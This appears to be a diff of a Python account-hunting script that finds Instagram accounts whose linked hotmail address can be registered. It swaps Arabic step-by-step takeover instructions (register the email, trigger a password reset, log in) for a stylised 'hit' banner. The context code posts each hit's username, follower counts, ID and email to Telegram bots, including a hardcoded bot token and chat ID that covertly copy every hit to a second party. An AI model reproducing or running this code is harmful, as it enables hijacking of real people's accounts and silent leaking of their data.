@@ -245,38 +245,42 @@ def hunting(email):
 		requests.post(f"""https://api.telegram.org/bot{tok}/sendvideo?chat_id={iD}&parse_mode=MarkdownV2&video=https://t.me/yyyyyy3w/15&caption=*• Cehennem Geliyor...
 • ||Ben En İyisi Olacağım.||*
 """);hunt = ("""
-طريقة تسجيل الدخول للحساب بكل سهولة:
-
-1️⃣ افتح تطبيق Gmail على موبايلك 📩
-2️⃣ اضغط على إضافة حساب جديد ➕ واختار hotmail
-3️⃣ اختر إنشاء حساب ✍️
-4️⃣ حط أي اسم وأي تاريخ ميلاد 🎂
-5️⃣ اكتب الإيميل يلي بعتلك ياه، وحط أي كلمة سر 🔑
-6️⃣ ادخل على البوت 🤖@indx2bot وارسل له الإيميل ✉️
-7️⃣ استنى شوي، ورح توصلك رسالة على الإيميل لتغيير كلمة سر الإنستا 📩🔄
-8⃣ بعدين، استخدم الإيميل وكلمة السر الجديدة وسجل دخول على إنستجرام 📸💙
-
-BY : @SYRIA7R
-الايميل:  ({}@hotmail.com)
+彡★彡 𝙂𝙤𝙩 𝙮𝙤𝙪 𝙖 𝙛𝙞𝙧𝙚 𝙖𝙘𝙘𝙤𝙪𝙣𝙩, 𝙗𝙧𝙤! 彡★彡
+╰☆☆ 𝙂𝙚𝙩 𝙧𝙚𝙖𝙙𝙮 𝙩𝙤 𝙨𝙝𝙞𝙣𝙚 ☆☆╮
+━━━━━━━━━━━━━━━━━━━━━
+✦ 𝕌𝕤𝕖𝕣𝕟𝕒𝕞𝕖 ➤ {}
+✦ ℕ𝕒𝕞𝕖 ➤ {}
+✦ 𝔼𝕞𝕒𝕚𝕝 ➤ {}@hotmail.com
+✦ 𝔽𝕠𝕝𝕝𝕠𝕨𝕖𝕣𝕤 ➤ {}
+✦ 𝔽𝕠𝕝𝕝𝕠𝕨𝕚𝕟𝕘 ➤ {}
+✦ 𝕀𝔻 ➤ {}
+✦ ℂ𝕣𝕖𝕒𝕥𝕖𝕕 𝕆𝕟 ➤ {}
+✦ ℙ𝕠𝕤𝕥𝕤 ➤ {}
+✦ ℂ𝕠𝕟𝕟𝕖𝕔𝕥𝕖𝕕 𝕋𝕠 ➤ {}
+✦ 𝕃𝕚𝕟𝕜 ➤ https://www.instagram.com/{}
+━━━━━━━━━━━━━━━━━━━━━
+𝔹𝕪: @𝕊𝕐ℝ𝕀𝔸𝟟ℝ
 
 		""".format(name,email,email,followers,following,Id,date,post,rest,email))
 		requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={iD}&text="+str(hunt))
 		requests.get("https://api.telegram.org/bot"+str('7906071721:AAE590zQ2Sj1f3RpEc6Vs5qZiJB7Ovb0puk')+"/sendMessage?chat_id="+str('1878687292')+"&text="+str(hunt))
 		print(nnn)				
 		hunt2 = ("""
-طريقة تسجيل الدخول للحساب بكل سهولة:
-
-1️⃣ افتح تطبيق Gmail على موبايلك 📩
-2️⃣ اضغط على إضافة حساب جديد ➕ واختار hotmail
-3️⃣ اختر إنشاء حساب ✍️
-4️⃣ حط أي اسم وأي تاريخ ميلاد 🎂
-5️⃣ اكتب الإيميل يلي بعتلك ياه، وحط أي كلمة سر 🔑
-6️⃣ ادخل على البوت 🤖@indx2bot وارسل له الإيميل ✉️
-7️⃣ استنى شوي، ورح توصلك رسالة على الإيميل لتغيير كلمة سر الإنستا 📩🔄
-8⃣ بعدين، استخدم الإيميل وكلمة السر الجديدة وسجل دخول على إنستجرام 📸💙
-
-BY : @SYRIA7R
-الايميل:  ({}@hotmail.com)
+彡★彡 𝙂𝙤𝙩 𝙮𝙤𝙪 𝙖 𝙛𝙞𝙧𝙚 𝙖𝙘𝙘𝙤𝙪𝙣𝙩, 𝙗𝙧𝙤! 彡★彡
+╰☆☆ 𝙂𝙚𝙩 𝙧𝙚𝙖𝙙𝙮 𝙩𝙤 𝙨𝙝𝙞𝙣𝙚 ☆☆╮
+━━━━━━━━━━━━━━━━━━━━━
+✦ 𝕌𝕤𝕖𝕣𝕟𝕒𝕞𝕖 ➤ {}
+✦ ℕ𝕒𝕞𝕖 ➤ {}
+✦ 𝔼𝕞𝕒𝕚𝕝 ➤ {}@hotmail.com
+✦ 𝔽𝕠𝕝𝕝𝕠𝕨𝕖𝕣𝕤 ➤ {}
+✦ 𝔽𝕠𝕝𝕝𝕠𝕨𝕚𝕟𝕘 ➤ {}
+✦ 𝕀𝔻 ➤ {}
+✦ ℂ𝕣𝕖𝕒𝕥𝕖𝕕 𝕆𝕟 ➤ {}
+✦ ℙ𝕠𝕤𝕥𝕤 ➤ {}
+✦ ℂ𝕠𝕟𝕟𝕖𝕔𝕥𝕖𝕕 𝕋𝕠 ➤ {}
+✦ 𝕃𝕚𝕟𝕜 ➤ https://www.instagram.com/{}
+━━━━━━━━━━━━━━━━━━━━━
+𝔹𝕪: @𝕊𝕐ℝ𝕀𝔸𝟟ℝ
 		""".format(name,email,email,followers,following,Id,date,post,rest,email))
 		Hit = Panel(hunt2);g(Panel(Hit, title=f"Instagram | {good_hot}"))
 	except :
